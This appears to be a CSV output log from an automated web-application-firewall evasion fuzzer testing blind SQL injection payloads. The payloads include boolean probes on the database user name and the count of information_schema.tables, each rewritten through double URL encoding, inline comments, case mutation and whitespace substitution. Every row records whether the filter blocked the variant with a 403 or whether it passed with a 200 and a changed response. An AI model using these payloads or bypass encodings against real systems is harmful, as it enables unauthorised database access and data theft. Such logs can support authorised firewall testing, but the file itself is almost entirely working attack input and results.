depth,category,label,reason,confidence,status,length,elapsed,input_preview,parent_preview
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00404,"1 AnD%0aAs%63%69I(SuBsT%72I%6e%67((s%45lEcT UsEr()),1,1))>100","1 AnD As%63%69I(SuBsT%72I%6e%67((s%45lEcT UsEr()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4724,0.00559,1%2520AND%2520%252561%252573%252563%252569i%2528s%252575bst%252572i%25256e%252567%2528%2528S%252545L%252545%252543%25255,"1 AND %61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54 %75%73er()),1,1))>100"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00393,"1 A/**/ND %61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54 %75%73er()),1,1))>100","1 AND %61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54 %75%73er()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00378,"1 %41N%44 %61%73%63%69i(s%75%62%73t%72%69%6%65%67((S%45%4c%45%43%54 %75%73%65r()),1,1))>100","1 AND %61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54 %75%73er()),1,1))>100"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00359,"1 AnD %61%73%63%69I(S%75BsT%72I%6e%67((s%45l%45%43%54 %75%73Er()),1,1))>100","1 AND %61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54 %75%73er()),1,1))>100"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00392,"1+AND+%61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54%0a%75%73er()),1,1))>100","1 AND %61%73%63%69i(s%75bst%72i%6e%67((S%45L%45%43%54 %75%73er()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4642,0.00599,1%2520AND%252509ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100,1%2520AND%252509ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4643,0.00531,1%2520AND%252509ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100 ,1%2520AND%252509ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4642,0.00562,1%2520AND%252509ASCII%2528SUBSTRING%2528%2528SELECT%2520USER%2528%2529%2529%252C1%252C1%2529%2529%253E100,1%2520AND%252509ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4642,0.00595,1%2520and%252509ascii%2528substring%2528%2528select%2520user%2528%2529%2529%252c1%252c1%2529%2529%253e100,1%2520AND%252509ascii%2528substring%2528%2528SELECT%2520user%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4690,0.00516,1%2520A/%252A%252A/ND%252509ascii%2528subst/%252A%252A/ring%2528%2528SELE/%252A%252A/CT%2520u/%252A%252A/ser%2528%2529%2,"1 A/**/ND%09ascii(subst/**/ring((SELE/**/CT u/**/ser()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00341,"1 A/**/%4eD%09a%73cii(%73%75%62%73t/**/ring((S%45%4cE/**/CT u/**/se%72()),1,1))>100","1 A/**/ND%09ascii(subst/**/ring((SELE/**/CT u/**/ser()),1,1))>100"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00379,"1 A/**/nD%09AsCiI(SuBsT/**/rInG((sElE/**/cT U/**/sEr()),1,1))>100","1 A/**/ND%09ascii(subst/**/ring((SELE/**/CT u/**/ser()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4642,0.00506,1%2520AnD%252509AsCiI%2528SuBsTrInG%2528%2528sElEcT%2520UsEr%2528%2529%2529%252C1%252C1%2529%2529%253E100,"1 AnD%09AsCiI(SuBsTrInG((sElEcT UsEr()),1,1))>100"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00364,"1 An/**/D%09AsCiI(SuBsTrI/**/nG((sE/**/lEcT Us/**/Er()),1,1))>100","1 AnD%09AsCiI(SuBsTrInG((sElEcT UsEr()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00368,"1 An%44%09A%73%43iI(S%75%42sTrIn%47((s%45l%45%63T %55sEr()),1,1))>100","1 AnD%09AsCiI(SuBsTrInG((sElEcT UsEr()),1,1))>100"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00402,"1	AnD%09AsCiI(SuBsTrInG((sElEcT UsEr()),1,1))>100","1 AnD%09AsCiI(SuBsTrInG((sElEcT UsEr()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4720,0.00613,1%2520A%25254eD%252509%252561%252573c%252569i%2528su%252562stri%25256eg%2528%2528%252553%252545%25254cE%252543%252554%25,"1 A%4eD%09%61%73c%69i(su%62stri%6eg((%53%45%4cE%43%54 %75s%65r()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00311,"1 A%4eD%09%61%73%63%69i(%73u%62stri%6eg((%53%45%4cE%43%54 %75s%65r()),1,1))>100","1 A%4eD%09%61%73c%69i(su%62stri%6eg((%53%45%4cE%43%54 %75s%65r()),1,1))>100"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00317,"1 A%4eD%09%61%73C%69I(Su%62sTrI%6eG((%53%45%4cE%43%54 %75s%65r()),1,1))>100","1 A%4eD%09%61%73c%69i(su%62stri%6eg((%53%45%4cE%43%54 %75s%65r()),1,1))>100"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00432,"1 A%4eD%09%61%73c%69i(su%62stri%6eg((%53%45%4cE%43%54/**/%75s%65r()),1,1))>100","1 A%4eD%09%61%73c%69i(su%62stri%6eg((%53%45%4cE%43%54 %75s%65r()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4644,0.00575,1%2520AND%252509ascii%2528substring%2528%2528SELECT%252509user%2528%2529%2529%252C1%252C1%2529%2529%253E100,"1 AND%09ascii(substring((SELECT%09user()),1,1))>100"
3,evasion_comment_insert,FILTERED,SIGNATURE_MATCHED_SQLI_PATTERN,0.95,403,146,0.00324,"1 AN/**/D%09ascii(subst/**/ring((S/**/ELECT%09user()),1,1))>100","1 AND%09ascii(substring((SELECT%09user()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00377,"1 A%4eD%09asc%69i(%73%75b%73t%72%69ng((SEL%45%43T%09us%65r()),1,1))>100","1 AND%09ascii(substring((SELECT%09user()),1,1))>100"
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00303,"1 AnD%09AsCiI(SuBsTrInG((sElEcT%09UsEr()),1,1))>100","1 AND%09ascii(substring((SELECT%09user()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.00506,1%2520AnD%2520AsCiI%2528SuBsTrInG%2528%2528sElEcT%2520UsEr%2528%2529%2529%252C1%252C1%2529%2529%253E100,1%2520AnD%2520AsCiI%2528SuBsTrInG%2528%2528sElEcT%2520UsEr%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4641,0.00559,1%2520AnD%2520AsCiI%2528SuBsTrInG%2528%2528sElEcT%2520UsEr%2528%2529%2529%252C1%252C1%2529%2529%253E100 ,1%2520AnD%2520AsCiI%2528SuBsTrInG%2528%2528sElEcT%2520UsEr%2528%2529%2529%252C1%252C1%2529%2529%253E100
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00534,"1 A/**/nD A/**/sCiI(SuBsT/**/rInG((sElEc/**/T UsE/**/r()),1,1))>100","1 A/**/nD A/**/sCiI(SuBsT/**/rInG((sElEc/**/T UsE/**/r()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00501,"1 A/**/nD A/**/sCiI(SuBsT/**/rInG((sElEc/**/T UsE/**/r()),1,1))>100 ","1 A/**/nD A/**/sCiI(SuBsT/**/rInG((sElEc/**/T UsE/**/r()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00582,"1 A/**/ND A/**/SCII(SUBST/**/RING((SELEC/**/T USE/**/R()),1,1))>100","1 A/**/nD A/**/sCiI(SuBsT/**/rInG((sElEc/**/T UsE/**/r()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00561,"1 a/**/nd a/**/scii(subst/**/ring((selec/**/t use/**/r()),1,1))>100","1 A/**/nD A/**/sCiI(SuBsT/**/rInG((sElEc/**/T UsE/**/r()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4730,0.00522,1%2520%252541n%252544%2520A%252573%252543%252569I%2528%252553%252575%252542%252573Tr%252549nG%2528%2528%252573E%25256cEc,"1 %41n%44 A%73%43%69I(%53%75%42%73Tr%49nG((%73E%6cEc%54 U%73E%72()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00346,"1 %41n%44 A%73%43%69I(%53%75%42%73%54r%49%6eG((%73%45%6cE%63%54 U%73E%72()),1,1))>100","1 %41n%44 A%73%43%69I(%53%75%42%73Tr%49nG((%73E%6cEc%54 U%73E%72()),1,1))>100"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00371,"1%0a%41n%44
A%73%43%69I(%53%75%42%73Tr%49nG((%73E%6cEc%54 U%73E%72()),1,1))>100","1 %41n%44 A%73%43%69I(%53%75%42%73Tr%49nG((%73E%6cEc%54 U%73E%72()),1,1))>100"
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.00556,1%2520AnD%2520AsCiI%2528SuBsTrInG%2528%2528sElEcT%252BUsEr%2528%2529%2529%252C1%252C1%2529%2529%253E100,"1 AnD AsCiI(SuBsTrInG((sElEcT+UsEr()),1,1))>100"
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00631,"1 A/**/nD A/**/sCiI(S/**/uBsTrInG((s/**/ElEcT+Us/**/Er()),1,1))>100","1 AnD AsCiI(SuBsTrInG((sElEcT+UsEr()),1,1))>100"
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00423,"1 An%44 %41%73%43i%49(%53uB%73TrI%6eG((sElEcT+%55%73%45r()),1,1))>100","1 AnD AsCiI(SuBsTrInG((sElEcT+UsEr()),1,1))>100"
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00315,"1	AnD AsCiI(SuBsTrInG((sElEcT+UsEr()),1,1))>100","1 AnD AsCiI(SuBsTrInG((sElEcT+UsEr()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00557,"1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00555,"1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100 ","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00614,"1 AN/**/D A/**/SCII(SUBSTRIN/**/G((S/**/ELECT US/**/ER()),1,1))>100","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4604,0.00616,"1 an/**/d a/**/scii(substrin/**/g((s/**/elect us/**/er()),1,1))>100","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100"
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4606,0.00531,"1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100  ","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100 "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00726,"1 AN/**/D A/**/SCII(SUBSTRIN/**/G((S/**/ELECT US/**/ER()),1,1))>100 ","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100 "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4605,0.00558,"1 an/**/d a/**/scii(substrin/**/g((s/**/elect us/**/er()),1,1))>100 ","1 AN/**/D a/**/scii(substrin/**/g((S/**/ELECT us/**/er()),1,1))>100 "
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4637,0.006,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4638,0.0051,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0 ,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4637,0.00512,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520INFORMATION_SCHEMA.TABLES%2529%253E0,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4637,0.00558,1%2520and%2520%2528select%2520count%2528%252a%2529%2520from%2520information_schema.tables%2529%253e0,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4639,0.0054,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0  ,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4638,0.0058,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520INFORMATION_SCHEMA.TABLES%2529%253E0 ,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4638,0.00546,1%2520and%2520%2528select%2520count%2528%252a%2529%2520from%2520information_schema.tables%2529%253e0 ,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520information_schema.tables%2529%253E0 
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4745,0.00591,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4746,0.00597,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4745,0.00506,1%2520%252541%25254E%252544%2520%2528%252553%252545%25254C%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4745,0.00648,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545c%252554%2520co%252555nt%2528%252a%2529%2520f%252552om%,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545C%252554%2520CO%252555NT%2528%252A%2529%2520F%252552OM%
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4745,0.0054,1%2520%252541%25254e%252544%2520%2528%252553%252545%25254c%252545c%252554%2520Co%252555nT%2528%252A%2529%2520f%252552oM%,1 %41%4e%44 (%53%45%4c%45c%54 Co%55nT(*) f%52oM %69%6e%66o%72mA%74Io%6E_ScHe%6Da.tAbL%65S)>0
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4653,0.00545,1 %41%4%65%44 (%53%45%4c%45c%54 Co%55%6e%54(*) %66%52oM %69%6%65%66%6f%72%6dA%74%49o%6E_Sc%48%65%6Da.t%41b%4c%65S)>0,1 %41%4e%44 (%53%45%4c%45c%54 Co%55nT(*) f%52oM %69%6e%66o%72mA%74Io%6E_ScHe%6Da.tAbL%65S)>0
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00385,1%0a%41%4e%44 (%53%45%4c%45c%54 Co%55nT(*) f%52oM+%69%6e%66o%72mA%74Io%6E_ScHe%6Da.tAbL%65S)>0,1 %41%4e%44 (%53%45%4c%45c%54 Co%55nT(*) f%52oM %69%6e%66o%72mA%74Io%6E_ScHe%6Da.tAbL%65S)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4653,0.00633,1 %41%4e%44 (%53%45%4c%45%43%54 CO%55NT(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0,1 %41%4e%44 (%53%45%4c%45%43%54 CO%55NT(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4654,0.00583,1 %41%4e%44 (%53%45%4c%45%43%54 CO%55NT(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0 ,1 %41%4e%44 (%53%45%4c%45%43%54 CO%55NT(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4653,0.00575,1 %41%4E%44 (%53%45%4C%45%43%54 CO%55NT(*) %46%52%4F%4D %69%6E%66O%72%6D%61%74IO%6E_%73%63%68%65%6%64A.TA%62L%65S)>0,1 %41%4e%44 (%53%45%4c%45%43%54 CO%55NT(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4653,0.00588,1 %41%4e%44 (%53%45%4c%45%43%54 co%55nt(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0,1 %41%4e%44 (%53%45%4c%45%43%54 CO%55NT(*) %46%52%4f%4d %69%6e%66o%72%6d%61%74io%6e_%73%63%68%65%6%64a.ta%62l%65s)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4639,0.00548,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%2520information_schema.tables%2529%253E0,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4640,0.00956,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%2520information_schema.tables%2529%253E0 ,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4639,0.01296,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250AFROM%2520INFORMATION_SCHEMA.TABLES%2529%253E0,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4639,0.00731,1%2520and%2520%2528select%2520count%2528%252a%2529%25250afrom%2520information_schema.tables%2529%253e0,1%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%2520information_schema.tables%2529%253E0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00659,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0aFROM i/**/nformation_schema.tables)>0,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0aFROM i/**/nformation_schema.tables)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4612,0.00705,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0aFROM i/**/nformation_schema.tables)>0 ,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0aFROM i/**/nformation_schema.tables)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00608,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0AFROM I/**/NFORMATION_SCHEMA.TABLES)>0,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0aFROM i/**/nformation_schema.tables)>0
3,stability_probe,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00633,1 an/**/d (s/**/elect c/**/ount(*)%0afrom i/**/nformation_schema.tables)>0,1 AN/**/D (S/**/ELECT C/**/OUNT(*)%0aFROM i/**/nformation_schema.tables)>0
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4639,0.00597,1%2520AnD%2520%2528sElEcT%2520CoUnT%2528%252A%2529%25250AfRoM%2520InFoRmAtIoN_ScHeMa.tAbLeS%2529%253E0,1 AnD (sElEcT CoUnT(*)%0AfRoM InFoRmAtIoN_ScHeMa.tAbLeS)>0
3,evasion_comment_insert,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4611,0.00593,1 An/**/D (sElE/**/cT C/**/oUnT(*)%0AfRoM I/**/nFoRmAtIoN_ScHeMa.tAbLeS)>0,1 AnD (sElEcT CoUnT(*)%0AfRoM InFoRmAtIoN_ScHeMa.tAbLeS)>0
3,evasion_unicode_encode,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00407,1 %41n%44 (sElE%63%54 %43%6f%55%6eT(*)%0%41fRoM InF%6f%52mAt%49oN_%53cHeMa.%74AbL%65%53)>0,1 AnD (sElEcT CoUnT(*)%0AfRoM InFoRmAtIoN_ScHeMa.tAbLeS)>0
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00403,1 AnD%09(sElEcT%09CoUnT(*)%0AfRoM+InFoRmAtIoN_ScHeMa.tAbLeS)>0,1 AnD (sElEcT CoUnT(*)%0AfRoM InFoRmAtIoN_ScHeMa.tAbLeS)>0
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4735,0.00517,1%2520%252541N%252544%2520%2528S%252545%25254cECT%2520%252543%25254f%252555%25254eT%2528%252A%2529%25250aFR%25254f%25254,1 %41N%44 (S%45%4cECT %43%4f%55%4eT(*)%0aFR%4f%4d i%6efor%6dation_sch%65ma.%74a%62%6ces)>0
3,evasion_unicode_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4659,0.00597,1 %41%4e%44 (%53%45%4%63E%43%54 %43%4f%55%4e%54(*)%0%61FR%4f%4%64 i%6efo%72%6d%61%74i%6fn_%73%63h%65ma.%74%61%62%6ce%73),1 %41N%44 (S%45%4cECT %43%4f%55%4eT(*)%0aFR%4f%4d i%6efor%6dation_sch%65ma.%74a%62%6ces)>0
3,evasion_case_mutation,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.004,1 %41n%44 (s%45%4cEcT %43%4f%55%4eT(*)%0AfR%4f%4D I%6eFoR%6dAtIoN_ScH%65Ma.%74A%62%6CeS)>0,1 %41N%44 (S%45%4cECT %43%4f%55%4eT(*)%0aFR%4f%4d i%6efor%6dation_sch%65ma.%74a%62%6ces)>0
3,evasion_whitespace_substitute,FILTERED,SIGNATURE_MATCHED_LIBINJECTION,0.95,403,146,0.00413,"1	%41N%44 (S%45%4cECT
%43%4f%55%4eT(*)%0aFR%4f%4d	i%6efor%6dation_sch%65ma.%74a%62%6ces)>0",1 %41N%44 (S%45%4cECT %43%4f%55%4eT(*)%0aFR%4f%4d i%6efor%6dation_sch%65ma.%74a%62%6ces)>0
3,evasion_double_encode,BEHAVIOR_CHANGE,RESPONSE_SHAPE_CHANGED,0.7,200,4643,0.00557,1%25250aAND%25250a%2528SELECT%2520COUNT%2528%252A%2529%25250aFROM%250Ainformation_schema.tables%2529%253E0,"1%0aAND%0a(SELECT COUNT(*)%0aFROM
information_schema.tables)>0"
